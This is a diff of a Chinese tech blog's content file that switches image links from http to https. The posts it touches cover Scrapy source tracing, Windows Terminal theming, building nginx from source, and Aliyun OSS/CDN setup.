 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">which</span> scrapy</span><br><span class="line">/root/Application/miniconda3/envs/py-3.9/bin/scrapy</span><br></pre></td></tr></table></figure>
 
 <p>先打开<code>Scrapy</code>文件看看.<br>可以看到最后是执行了<code>execute()</code>方法, 这个方法不正是我们用<code>Python</code>运行<code>Scrapy</code>的来进行调试的方法吗?</p>
-<p><img data-src="http://img.owq.world/2022/01/1644-5f57fa.png"></p>
+<p><img data-src="https://img.owq.world/2022/01/1644-5f57fa.png"></p>
 <p>接下来让我们进入内部看看它做了些什么, 这里只注重主逻辑, 一些细节处就不去刨析了.</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">execute</span>(<span class="params">argv=<span class="literal">None</span>, settings=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> argv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        argv = sys.argv</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> settings <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        settings = get_project_settings()	<span class="comment"># 这里进行了配置的加载</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            editor = os.environ[<span class="string">&#x27;EDITOR&#x27;</span>]</span><br><span class="line">        <span class="keyword">except</span> KeyError:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            settings[<span class="string">&#x27;EDITOR&#x27;</span>] = editor</span><br><span class="line"></span><br><span class="line">    inproject = inside_project()</span><br><span class="line">    cmds = _get_commands_dict(settings, inproject)	<span class="comment"># 加载了Scrapy命令模块</span></span><br><span class="line">    cmdname = _pop_command_name(argv)</span><br><span class="line">    parser = optparse.OptionParser(formatter=optparse.TitledHelpFormatter(),</span><br><span class="line">                                   conflict_handler=<span class="string">&#x27;resolve&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cmdname:</span><br><span class="line">        _print_commands(settings, inproject)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> cmdname <span class="keyword">not</span> <span class="keyword">in</span> cmds:</span><br><span class="line">        _print_unknown_command(settings, cmdname, inproject)</span><br><span class="line">        sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    cmd = cmds[cmdname]	<span class="comment"># 命令行参数获取映射</span></span><br><span class="line">    parser.usage = <span class="string">f&quot;scrapy <span class="subst">&#123;cmdname&#125;</span> <span class="subst">&#123;cmd.syntax()&#125;</span>&quot;</span></span><br><span class="line">    parser.description = cmd.long_desc()</span><br><span class="line">    settings.setdict(cmd.default_settings, priority=<span class="string">&#x27;command&#x27;</span>)</span><br><span class="line">    cmd.settings = settings</span><br><span class="line">    cmd.add_options(parser)</span><br><span class="line">    opts, args = parser.parse_args(args=argv[<span class="number">1</span>:])</span><br><span class="line">    _run_print_help(parser, cmd.process_options, args, opts)</span><br><span class="line"></span><br><span class="line">    cmd.crawler_process = CrawlerProcess(settings)	<span class="comment"># 动态加载爬虫模块</span></span><br><span class="line">    _run_print_help(parser, _run_command, cmd, args, opts)	<span class="comment"># 实例化爬虫类和启动引擎</span></span><br><span class="line">    sys.exit(cmd.exitcode)</span><br></pre></td></tr></table></figure>
 
 <p>先看看<code>get_project_settings()</code></p>
-<p><img data-src="http://img.owq.world/2022/01/1453-5f4a43.png"></p>
+<p><img data-src="https://img.owq.world/2022/01/1453-5f4a43.png"></p>
 <p>里面重要的地方是初始化<code>Settings</code>类的过程</p>
-<p><img data-src="http://img.owq.world/2022/01/1447-ded0a5.png"></p>
+<p><img data-src="https://img.owq.world/2022/01/1447-ded0a5.png"></p>
 <p><code>Settings</code>类进行了模块的动态加载, <code>self.setmodule</code>最终会调用<code>import_module()</code>方法</p>
-<p><img data-src="http://img.owq.world/2022/01/1708-80010a.png"></p>
+<p><img data-src="https://img.owq.world/2022/01/1708-80010a.png"></p>
 <p>通过调试看看<code>settings</code>下,最后加载了<code>attributes</code>里一大堆配置.</p>
-<p><img data-src="http://img.owq.world/2022/01/1445-54618b.png"></p>
+<p><img data-src="https://img.owq.world/2022/01/1445-54618b.png"></p>
 <p>接下来看看<code>_get_commands_dict()</code></p>
-<p><img data-src="http://img.owq.world/2022/01/1455-224efe.png"></p>
+<p><img data-src="https://img.owq.world/2022/01/1455-224efe.png"></p>
 <p>这里主要加载了<code>scrapy.commands</code>下所有模块</p>
-<p><img data-src="http://img.owq.world/2022/01/1501-4e87e3.png"></p>
-<p><img data-src="http://img.owq.world/2022/01/1515-04bf67.png"></p>
+<p><img data-src="https://img.owq.world/2022/01/1501-4e87e3.png"></p>
+<p><img data-src="https://img.owq.world/2022/01/1515-04bf67.png"></p>
 <p>最后返回模块名和其映射，仔细看看这不就是运行<code>Scrapy</code>的命令吗</p>
-<p><img data-src="http://img.owq.world/2022/01/1514-577b65.png"></p>
+<p><img data-src="https://img.owq.world/2022/01/1514-577b65.png"></p>
 <p>继续往下看，加载<code>Scrapy</code>自带的解析器后，开始准备命令的执行工作了。</p>
-<p><img data-src="http://img.owq.world/2022/01/1532-684509.png"></p>
+<p><img data-src="https://img.owq.world/2022/01/1532-684509.png"></p>
 <p>准备工作做完了，开始初始化<code>CrawlerProcess()</code></p>
-<p><img data-src="http://img.owq.world/2022/01/1537-269ec9.png"></p>
+<p><img data-src="https://img.owq.world/2022/01/1537-269ec9.png"></p>
 <p>看看继承的类<code>CrawlerRunner</code>， 这个才是重点</p>
-<p><img data-src="http://img.owq.world/2022/01/1542-f41c3c.png"></p>
+<p><img data-src="https://img.owq.world/2022/01/1542-f41c3c.png"></p>
 <p><code>CrawlerRunner</code>的<code>__init__</code>调用了<code>_get_spider_loader(settings)</code>,它调用了<code>load_object()</code>方法</p>
-<p><img data-src="http://img.owq.world/2022/01/1550-d35b02.png"></p>
+<p><img data-src="https://img.owq.world/2022/01/1550-d35b02.png"></p>
 <p><code>load_object()</code>使用<code>import_module()</code>动态加载了<code>scrapy.spiderloader</code>模块</p>
-<p><img data-src="http://img.owq.world/2022/01/1555-c331b2.png"></p>
+<p><img data-src="https://img.owq.world/2022/01/1555-c331b2.png"></p>
 <p><code>SpiderLoader</code>加载时调用了<code>_load_all_spiders()</code>方法</p>
-<p><img data-src="http://img.owq.world/2022/01/1558-e763f6.png"></p>
+<p><img data-src="https://img.owq.world/2022/01/1558-e763f6.png"></p>
 <p>它通过<code>walk_modules</code>方法加载了spiders目录下所有的爬虫</p>
-<p><img data-src="http://img.owq.world/2022/01/1601-2b4ada.png" alt="image-20220105160151008"></p>
+<p><img data-src="https://img.owq.world/2022/01/1601-2b4ada.png" alt="image-20220105160151008"></p>
 <p>接下来看看<code>_run_command</code>方法。</p>
-<p><img data-src="http://img.owq.world/2022/01/1608-f3621c.png"></p>
+<p><img data-src="https://img.owq.world/2022/01/1608-f3621c.png"></p>
 <p>它最后都会执行<code>scrapy.commands.crawl</code>里的<code>run</code>方法，启动爬虫引擎，这也是极其重要的一步.<br>其中<code>crawl</code>方法会实例化<code>scrapy.crawler.Crawler</code>类, 之后通过<code>start()</code>来启动爬虫引擎.</p>
-<p><img data-src="http://img.owq.world/2022/01/1638-ca1010.png" alt="image-20220105163802583"></p>
+<p><img data-src="https://img.owq.world/2022/01/1638-ca1010.png" alt="image-20220105163802583"></p>
 <p>至此, 大致的执行逻辑就捋清了<code>ヾ(•ω•</code>)o&#96;</p>
 <h2 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h2><h3 id="import-module"><a href="#import-module" class="headerlink" title="import_module()"></a>import_module()</h3><blockquote>
 <p>这是<code>Python</code>自带<code>importlib</code>库的方法, 也是进行动态加载模块的关键, <code>Scrapy</code>的很多方法都使用到它.</p>
@@ -1397,10 +1397,10 @@
 <p>项目地址 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3J5YW5vYXNpcy9uZXJkLWZvbnRz">🚪</span><br>下载地址 -&gt; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3J5YW5vYXNpcy9uZXJkLWZvbnRzL3JlbGVhc2VzL2Rvd25sb2FkL3YyLjEuMC9GaXJhQ29kZS56aXA=">🚪</span></p>
 </blockquote>
 <p>将安装包内的 <code>FiraCode</code> 系列字体解压安装</p>
-<img data-src="http://img.owq.world/2021/12/1637-38fb5b.png" style="zoom: 80%;" />
+<img data-src="https://img.owq.world/2021/12/1637-38fb5b.png" style="zoom: 80%;" />
 
 <p>终端字体配置使用<code>FiraCode Nerd Font</code>即可生效</p>
-<img data-src="http://img.owq.world/2021/12/1641-8e55ff.png" style="zoom:67%;" />
+<img data-src="https://img.owq.world/2021/12/1641-8e55ff.png" style="zoom:67%;" />
 
 <h3 id="果冻颜色方案"><a href="#果冻颜色方案" class="headerlink" title="果冻颜色方案"></a>果冻颜色方案</h3><blockquote>
 <p>个人专属果冻配色（￣。。￣）</p>
@@ -1408,7 +1408,7 @@
 <p><code>schemes</code> 标签里添加</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;background&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#2C2C2C&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;black&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#4A4A4A&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;blue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#69B4D9&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightBlack&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#A8A8A8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightBlue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#669AEB&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightCyan&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#32EBDA&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightGreen&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#31D328&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightPurple&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#A972AD&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightRed&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FD5469&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightWhite&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#E6E6E6&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;brightYellow&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#F1E452&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cursorColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FFFFFF&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cyan&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#80F3DA&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;foreground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FCFCFC&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;green&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#91D97A&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Default&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;purple&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#AD7FA8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;red&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#E06C75&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;selectionBackground&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FFFFFF&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;white&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#FFFFE4&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;yellow&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#EEE691&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 
-<h3 id="最终效果图"><a href="#最终效果图" class="headerlink" title="最终效果图"></a>最终效果图</h3><p><img data-src="http://img.owq.world/2021/12/1716-d121ee.png"></p>
+<h3 id="最终效果图"><a href="#最终效果图" class="headerlink" title="最终效果图"></a>最终效果图</h3><p><img data-src="https://img.owq.world/2021/12/1716-d121ee.png"></p>
 <h2 id="快捷键配置"><a href="#快捷键配置" class="headerlink" title="快捷键配置"></a>快捷键配置</h2><p>将常用快捷操作和系统快捷键统一</p>
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;actions&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;toggleFullscreen&quot;</span><span class="punctuation">,</span>  <span class="comment">// 全屏切换</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+m&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;find&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctrl+f&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;closePane&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctrl+w&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;copy&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;singleLine&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctrl+c&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;paste&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ctrl+v&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;splitPane&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;split&quot;</span><span class="punctuation">:</span> <span class="string">&quot;auto&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;splitMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;duplicate&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+shift+d&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;newTab&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">0</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+shift+1&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;newTab&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+shift+2&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;newTab&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">2</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+shift+3&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    	<span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;newTab&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">3</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+shift+4&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;newTab&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">4</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="string">&quot;alt+shift+5&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
 
@@ -1416,7 +1416,7 @@
 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;experimental.retroTerminalEffect&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span>	<span class="comment">// 复古风格</span></span><br><span class="line"><span class="attr">&quot;font&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;weight&quot;</span><span class="punctuation">:</span> <span class="string">&quot;medium&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span>	<span class="comment">// 字体自定义</span></span><br><span class="line"><span class="attr">&quot;startingDirectory&quot;</span><span class="punctuation">:</span> <span class="string">&quot;//wsl$/kali-linux/&quot;</span>	<span class="comment">// 初始目录</span></span><br></pre></td></tr></table></figure>
 
 <p>也可以直接在设置里面操作设置</p>
-<p><img data-src="http://img.owq.world/2021/12/1730-e12888.png"></p>
+<p><img data-src="https://img.owq.world/2021/12/1730-e12888.png"></p>
 ]]></content>
       <categories>
         <category>配置记录</category>
@@ -1461,7 +1461,7 @@
 <h3 id="下载编译"><a href="#下载编译" class="headerlink" title="下载编译"></a>下载编译</h3><blockquote>
 <p>默认情况下，NGINX 将安装在<code>/usr/local/nginx</code>.</p>
 </blockquote>
-<p>进入<span class="exturl" data-url="aHR0cHM6Ly9uZ2lueC5vcmcvZW4vZG93bmxvYWQuaHRtbA==">下载页面</span>, 获取稳定版本下载链接<br><img data-src="http://img.owq.world/2021/11/1650-4a1fe7.png"></p>
+<p>进入<span class="exturl" data-url="aHR0cHM6Ly9uZ2lueC5vcmcvZW4vZG93bmxvYWQuaHRtbA==">下载页面</span>, 获取稳定版本下载链接<br><img data-src="https://img.owq.world/2021/11/1650-4a1fe7.png"></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget http://nginx.org/download/nginx-1.20.1.tar.gz</span><br></pre></td></tr></table></figure>
 
 <p>创建目录进行包管理（方便之后使用其它版本）</p>
@@ -1490,7 +1490,7 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./configure \</span><br><span class="line">--prefix=/usr/local/nginx \</span><br><span class="line">--sbin-path=/usr/local/nginx/nginx \</span><br><span class="line">--modules-path=/usr/local/nginx/modules \</span><br><span class="line">--conf-path=/usr/local/nginx/nginx.conf \</span><br><span class="line">--error-log-path=/usr/local/nginx/logs/error.log \</span><br><span class="line">--http-log-path=/usr/local/nginx/logs/access.log \</span><br><span class="line">--pid-path=/usr/local/nginx/logs/nginx.pid \</span><br><span class="line">--lock-path=/usr/local/nginx/logs/nginx.lock \</span><br><span class="line">--with-debug --with-compat --with-pcre-jit --with-http_ssl_module --with-http_stub_status_module --with-http_realip_module --with-http_auth_request_module --with-http_v2_module --with-http_dav_module --with-http_slice_module --with-threads --with-http_addition_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_sub_module --with-stream_ssl_module --with-mail_ssl_module --with-stream</span><br></pre></td></tr></table></figure>
 
 <p>最后会输出配置信息</p>
-<p><img data-src="http://img.owq.world/2021/11/1702-d6315d.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/1702-d6315d.png"></p>
 <h2 id="卸载操作"><a href="#卸载操作" class="headerlink" title="卸载操作"></a>卸载操作</h2><p>停止nginx进程</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -s stop</span><br></pre></td></tr></table></figure>
 
@@ -1525,7 +1525,7 @@
 <p>在不停止Nginx服务的情况下进行平滑升级</p>
 </blockquote>
 <p>准备已编译好的新版目录(安装步骤执行到<code>make install</code>之前)<br>执行<code>make install</code>的话会<strong>覆盖</strong>掉原本的配置文件</p>
-<p><img data-src="http://img.owq.world/2021/11/1733-352115.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/1733-352115.png"></p>
 <p>下面操作会将<code>nginx-1.20.1</code>升级到<code>nginx-1.20.2</code></p>
 <ol>
 <li><p>备份旧版nginx可执行文件</p>
@@ -1538,7 +1538,7 @@
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -t</span><br></pre></td></tr></table></figure>
 </li>
 <li><p>执行<code>make upgrade</code></p>
-<p><img data-src="http://img.owq.world/2021/11/1750-91c660.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/1750-91c660.png"></p>
 </li>
 </ol>
 <p>命令没有报错就成功了~</p>
@@ -1573,89 +1573,89 @@
 <li>子域名(外网跳转) -&gt; CDN(内网访问) -&gt; OSS(资源文件)</li>
 </ul>
 <h2 id="创建OSS"><a href="#创建OSS" class="headerlink" title="创建OSS"></a>创建OSS</h2><p>打开阿里云 <span class="exturl" data-url="aHR0cHM6Ly9vc3MuY29uc29sZS5hbGl5dW4uY29tL292ZXJ2aWV3">对象存储OSS</span><br>链接失效的话, 手动点击右上角菜单找到<code>对象存储OSS</code>打开</p>
-<p><em><img data-src="http://img.owq.world/2021/11/2044-022e40.png" style="zoom: 50%;" /></em></p>
+<p><em><img data-src="https://img.owq.world/2021/11/2044-022e40.png" style="zoom: 50%;" /></em></p>
 <p>找到<code>Bucket列表</code>点击<code>创建Bucket</code></p>
-<img data-src="http://img.owq.world/2021/11/1541-68155b.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/1541-68155b.png" style="zoom:50%;" />
 
 <p>这里注意几个点就行了，名称和地域自行选择，<strong>存储类型</strong>选择<strong>标准存储</strong>，<strong>读写权限</strong>选择<strong>私有</strong>（<em>之后通过CDN加速访问，不走公网流量</em>），其它服务一般用不到，所以选择不开通，然后点击确认。</p>
-<img data-src="http://img.owq.world/2021/11/1543-217218.png" style="zoom:67%;" />
+<img data-src="https://img.owq.world/2021/11/1543-217218.png" style="zoom:67%;" />
 
 <p>然后看看你的 Bucket列表 是不是多了一个Bucket</p>
-<p><img data-src="http://img.owq.world/2021/11/2055-4aa5bc.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2055-4aa5bc.png"></p>
 <h2 id="资源包购买"><a href="#资源包购买" class="headerlink" title="资源包购买"></a>资源包购买</h2><blockquote>
 <p>如果你储存的数据只有几G, 甚至不到1G的话，是没有购买的必要的, 因为使用按量计算价格反而会比购买资源包便宜。</p>
 <p>具体可以参考阿里云产品价格 -&gt; <span class="exturl" data-url="aHR0cHM6Ly93d3cuYWxpeXVuLmNvbS9wcmljZS9wcm9kdWN0">🚪</span></p>
 </blockquote>
-<p><img data-src="http://img.owq.world/2021/11/2125-8bdcd6.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2125-8bdcd6.png"></p>
 <p>按图示进入购买资源包页面</p>
-<img data-src="http://img.owq.world/2021/11/2058-d7c8f7.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2058-d7c8f7.png" style="zoom:50%;" />
 
 <p>然后选择对应储存下单购买即可</p>
-<p><img data-src="http://img.owq.world/2021/11/2123-4c2bfd.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2123-4c2bfd.png"></p>
 <h2 id="配置域名绑定"><a href="#配置域名绑定" class="headerlink" title="配置域名绑定"></a>配置域名绑定</h2><blockquote>
 <p>只有绑定好域名后才能配置CDN加速.</p>
 </blockquote>
 <p>打开刚刚创建的<code>Bucket</code></p>
-<img data-src="http://img.owq.world/2021/11/2151-6ad1d9.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2151-6ad1d9.png" style="zoom:50%;" />
 
 <p>进入传输管理, 点击绑定域名</p>
-<img data-src="http://img.owq.world/2021/11/2204-213d3a.png" style="zoom:50%;" />
+<img data-src="https://img.owq.world/2021/11/2204-213d3a.png" style="zoom:50%;" />
 
 
 
 <p>输入要绑定的子域名, 勾上自动添加解析然后提交</p>
-<img data-src="http://img.owq.world/2021/11/2210-888938.png" style="zoom: 50%;" />
+<img data-src="https://img.owq.world/2021/11/2210-888938.png" style="zoom: 50%;" />
 
 
 
-<p>这时候访问域名会跳转到oss处, 但是因为<code>Bucket</code>设置的是私有, 所以外网是没法访问里面的文件, 但是通过CDN却可以, 所以接下来配置CDN<br><img data-src="http://img.owq.world/2021/11/2214-250364.png" style="zoom: 67%;" /></p>
+<p>这时候访问域名会跳转到oss处, 但是因为<code>Bucket</code>设置的是私有, 所以外网是没法访问里面的文件, 但是通过CDN却可以, 所以接下来配置CDN<br><img data-src="https://img.owq.world/2021/11/2214-250364.png" style="zoom: 67%;" /></p>
 <h2 id="配置CDN加速"><a href="#配置CDN加速" class="headerlink" title="配置CDN加速"></a>配置CDN加速</h2><blockquote>
 <p>CDN可以让你图片加载更快, 我们还可以通过阿里云的CDN控制台配置第一道防护墙, 防止服务器被攻击, 跑太多流量而造成金钱损失.</p>
 </blockquote>
 <p>进入CDN配置</p>
-<p><img data-src="http://img.owq.world/2021/11/2227-615f8f.png"></p>
-<p><img data-src="http://img.owq.world/2021/11/2230-02d11e.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2227-615f8f.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2230-02d11e.png"></p>
 <p>点击新增源站信息,选择刚才创建的oss</p>
-<img data-src="http://img.owq.world/2021/11/2231-eac809.png" style="zoom: 80%;" />
+<img data-src="https://img.owq.world/2021/11/2231-eac809.png" style="zoom: 80%;" />
 
 <p>  进入下一步</p>
-<p><img data-src="http://img.owq.world/2021/11/2232-255f3f.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2232-255f3f.png"></p>
 <p>接下来就是一大堆可选配置了，这里稍微配置下安全性，其它的请自行阅读说明进行配置<del>绝对不是因为说明太详细我懒的写</del></p>
-<p><img data-src="http://img.owq.world/2021/11/2237-4ccd07.png"></p>
+<p><img data-src="https://img.owq.world/2021/11/2237-4ccd07.png"></p>
 <p>修改配置设置带宽封顶，可以避免被恶意攻击或刷流量而产生高额的CDN账单。</p>
